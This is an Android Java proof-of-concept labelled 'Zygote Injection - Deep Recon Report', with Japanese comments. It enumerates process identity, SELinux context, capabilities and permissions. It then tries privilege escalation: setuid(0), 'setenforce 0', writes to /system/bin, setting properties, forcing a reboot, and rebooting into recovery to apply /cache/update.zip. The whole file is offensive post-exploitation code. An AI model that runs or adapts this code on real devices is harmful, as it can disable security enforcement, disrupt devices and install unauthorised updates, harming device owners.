// PrivilegeEscalation.java (リフレクション版)
package com.poc;

import android.os.IBinder;
import android.os.Process;
import android.system.ErrnoException;
import android.system.Os;
import android.system.OsConstants;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Main {

    private static final String REPORT_PATH = "/cache/exploit_report.txt";

    public static void main(String[] args) {
        StringBuilder report = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());

        report.append("========================================\n");
        report.append("   Zygote Injection - Deep Recon Report\n");
        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
        report.append("========================================\n\n");

        try {
            // --- [1] Basic Process Identity ---
            report.append("--- [1] Basic Process Identity ---\n");
            int uid = Process.myUid();
            int gid = Process.myGid(); // Android 9 では myGid() が存在しない場合は、Process.myUid() で代用?
            int pid = Process.myPid();
            report.append("UID: ").append(uid).append("\n");
            report.append("GID: ").append(gid).append("\n");
            report.append("PID: ").append(pid).append("\n");

            // パッケージ名の取得 (リフレクション)
            Object pm = getPackageManagerService();
            if (pm != null) {
                try {
                    Method getPackagesForUid = pm.getClass().getMethod("getPackagesForUid", int.class);
                    String[] pkgs = (String[]) getPackagesForUid.invoke(pm, uid);
                    report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
                } catch (Exception e) {
                    report.append("Related Packages: Error - ").append(e.getMessage()).append("\n\n");
                }
            } else {
                report.append("Related Packages: Service not available\n\n");
            }

            // --- [2] SELinux Context ---
            report.append("--- [2] SELinux Context ---\n");
            report.append("Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");

            // --- [3] Capabilities ---
            report.append("--- [3] Linux Capabilities ---\n");
            report.append(dumpCapabilities()).append("\n");

            // --- [4] System Properties ---
            report.append("--- [4] Key System Properties ---\n");
            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n");
            report.append("ro.secure: ").append(getProp("ro.secure")).append("\n\n");

            // --- [5] Filesystem Access ---
            report.append("--- [5] Filesystem Access Tests ---\n");
            report.append("Write test (/cache/): ").append(writeTest("/cache/test_write.tmp")).append("\n");
            report.append("Write test (current dir): ").append(writeTest("./test_write.tmp")).append("\n");
            report.append("Execute test (/system/bin/sh): ").append(canExecute("/system/bin/sh")).append("\n");
            report.append("Execute test (/data/local/tmp): ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");

            // --- [6] Permission check (reflection) ---
            report.append("--- [6] Android Runtime Permissions (Reflection) ---\n");
            if (pm != null) {
                String[] perms = {
                    "android.permission.INSTALL_PACKAGES",
                    "android.permission.DELETE_PACKAGES",
                    "android.permission.WRITE_SECURE_SETTINGS",
                    "android.permission.REBOOT",
                    "android.permission.SHUTDOWN",
                    "android.permission.INTERACT_ACROSS_USERS",
                    "android.permission.RECOVERY",
                    "android.permission.DUMP",
                    "android.permission.SET_TIME",
                    "android.permission.SET_TIME_ZONE"
                };
                for (String p : perms) {
                    try {
                        Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
                        int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                    } catch (Exception e) {
                        report.append("checkPermission(").append(p).append("): Error - ").append(e.getMessage()).append("\n");
                    }
                }
            } else {
                report.append("PackageManager not available\n");
            }
            report.append("\n");

            // --- [7] Service status ---
            report.append("--- [7] System Services (Binder) ---\n");
            report.append("package: ").append(serviceStatus("package")).append("\n");
            report.append("power: ").append(serviceStatus("power")).append("\n");
            report.append("recovery: ").append(serviceStatus("recovery")).append("\n");
            report.append("permission: ").append(serviceStatus("permission")).append("\n\n");

            // --- [8] Privilege Escalation Attempts ---
            report.append("--- [8] Privilege Escalation Attempts ---\n");

            // setuid(0)
            report.append("[setuid(0)]: ");
            try { Os.setuid(0); report.append("SUCCESS (Root!)\n"); } catch (ErrnoException e) { report.append("FAILED (EPERM)\n"); }

            // setresuid(0,0,0)
            report.append("[setresuid(0,0,0)]: ");
            try { Os.setresuid(0, 0, 0); report.append("SUCCESS\n"); } catch (ErrnoException e) { report.append("FAILED\n"); }

            // /proc/self/oom_score_adj
            report.append("[write /proc/self/oom_score_adj]: ");
            try { new FileWriter("/proc/self/oom_score_adj").write("0"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED\n"); }

            // setenforce 0
            report.append("[setenforce 0]: ");
            try {
                java.lang.Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/setenforce", "0"});
                int code = p.waitFor();
                report.append(code == 0 ? "SUCCESS (Permissive)\n" : "FAILED (exit=" + code + ")\n");
            } catch (Exception e) { report.append("FAILED\n"); }

            // /system 書き込み
            report.append("[write /system/bin/test]: ");
            try { new FileWriter("/system/bin/test_write", true).write("test"); report.append("SUCCESS\n"); } catch (IOException e) { report.append("FAILED (Read-only)\n"); }

            // setprop
            report.append("[setprop test.prop 1]: ");
            try {
                Class.forName("android.os.SystemProperties").getMethod("set", String.class, String.class)
                        .invoke(null, "test.prop", "1");
                report.append("SUCCESS\n");
            } catch (Exception e) { report.append("FAILED\n"); }

            // IPowerManager.reboot (reflection)
            report.append("[IPowerManager.reboot]: ");
            Object power = getService("power");
            if (power != null) {
                try {
                    Method reboot = power.getClass().getMethod("reboot", boolean.class, String.class, boolean.class);
                    reboot.invoke(power, false, "", false);
                    report.append("SUCCESS (device rebooting)\n");
                } catch (Exception e) {
                    report.append("FAILED (RemoteException or Security): ").append(e.getMessage()).append("\n");
                }
            } else {
                report.append("FAILED (service null)\n");
            }

            // IRecoverySystem.rebootRecoveryWithCommand (reflection)
            report.append("[IRecoverySystem.rebootRecoveryWithCommand]: ");
            Object rec = getService("recovery");
            if (rec != null) {
                try {
                    Method rebootRec = rec.getClass().getMethod("rebootRecoveryWithCommand", String.class);
                    rebootRec.invoke(rec, "--update_package=/cache/update.zip");
                    report.append("SUCCESS\n");
                } catch (Exception e) {
                    report.append("FAILED: ").append(e.getMessage()).append("\n");
                }
            } else {
                report.append("FAILED (service null)\n");
            }

            report.append("\n========================================\n");
            report.append("   End of Report\n");
            report.append("========================================\n");

        } catch (Throwable t) {
            report.append("\n!!! CRITICAL EXCEPTION: ").append(t.toString()).append("\n");
            t.printStackTrace();
        }

        // Save report
        try {
            saveReport(report.toString());
            System.out.println("[+] Report saved to " + REPORT_PATH);
        } catch (IOException e) {
            System.err.println("[-] Failed to save report: " + e.getMessage());
            try {
                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
                System.out.println("[+] Saved to /data/local/tmp/exploit_report.txt");
            } catch (IOException ex) {
                System.err.println("[-] Could not save report anywhere.");
            }
        }
    }

    // ----- Utilities -----
    private static void saveReport(String content) throws IOException {
        File reportFile = new File(REPORT_PATH);
        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) { w.write(content); }
        try { Os.chmod(REPORT_PATH, OsConstants.S_IRUSR | OsConstants.S_IWUSR | OsConstants.S_IRGRP | OsConstants.S_IROTH); } catch (ErrnoException ignored) {}
    }

    private static String readFile(String path) {
        try { return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim(); }
        catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String dumpCapabilities() {
        try {
            // Use reflection for StructCapUserHeader and StructCapUserData if needed, but Os.capget is available.
            // Actually, Os.capget and StructCapUserHeader are in android.system package, which is in android.jar.
            // But to avoid import errors, we can do it with direct call (they exist in runtime).
            // However, compiling will fail if imports are missing. So we use reflection for capget as well.
            // But for simplicity, we assume Os.capget is available. If not, we catch and return error.
            // Since Os is in android.jar, we keep direct usage.
            // But StructCapUserHeader might be missing in compile-time if SDK version low.
            // We'll catch and return error.
            try {
                Class<?> capHeaderClass = Class.forName("android.system.StructCapUserHeader");
                Object header = capHeaderClass.getConstructor(int.class, int.class).newInstance(OsConstants._LINUX_CAPABILITY_VERSION_3, 0);
                Method capget = Os.class.getMethod("capget", capHeaderClass);
                Object[] data = (Object[]) capget.invoke(null, header);
                // data[0] and data[1] are StructCapUserData
                // Extract fields via reflection
                Method getEffective = data[0].getClass().getMethod("effective");
                Method getPermitted = data[0].getClass().getMethod("permitted");
                Method getInheritable = data[0].getClass().getMethod("inheritable");
                long eff0 = (int) getEffective.invoke(data[0]);
                long perm0 = (int) getPermitted.invoke(data[0]);
                long inh0 = (int) getInheritable.invoke(data[0]);
                long eff1 = (int) getEffective.invoke(data[1]);
                long perm1 = (int) getPermitted.invoke(data[1]);
                long inh1 = (int) getInheritable.invoke(data[1]);
                return "Effective: " + Long.toHexString(eff0 | (eff1 << 32)) + "\n" +
                       "Permitted: " + Long.toHexString(perm0 | (perm1 << 32)) + "\n" +
                       "Inheritable: " + Long.toHexString(inh0 | (inh1 << 32));
            } catch (Exception e) {
                return "Failed to get capabilities: " + e.getMessage();
            }
        } catch (Exception e) {
            return "Capability dump error: " + e.getMessage();
        }
    }

    private static String getProp(String key) {
        try { return (String) Class.forName("android.os.SystemProperties").getMethod("get", String.class, String.class).invoke(null, key, "(null)"); }
        catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String writeTest(String path) {
        try { File f = new File(path); new FileWriter(f).write("test"); return f.delete() ? "SUCCESS (write/delete)" : "SUCCESS (write)"; }
        catch (IOException e) { return "FAILED: " + e.getMessage(); }
    }

    private static String canExecute(String path) {
        File f = new File(path);
        if (f.exists()) return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
        else { File p = f.getParentFile(); return p != null && p.exists() ? "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO") : "PATH NOT FOUND"; }
    }

    // ---- Reflection based ServiceManager and Stub.asInterface ----
    private static Object getService(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, name);
            if (binder == null) return null;
            // Determine which stub to use based on name
            if ("package".equals(name)) {
                Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                return asInterface.invoke(null, binder);
            } else if ("power".equals(name)) {
                Class<?> stubClass = Class.forName("android.os.IPowerManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                return asInterface.invoke(null, binder);
            } else if ("recovery".equals(name)) {
                Class<?> stubClass = Class.forName("android.os.IRecoverySystem$Stub");
                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
                return asInterface.invoke(null, binder);
            } else {
                return binder; // fallback
            }
        } catch (Exception e) {
            return null;
        }
    }

    private static Object getPackageManagerService() {
        return getService("package");
    }

    private static String serviceStatus(String name) {
        try {
            IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class).invoke(null, name);
            return (binder != null && binder.isBinderAlive()) ? "ALIVE" : "NULL or DEAD";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
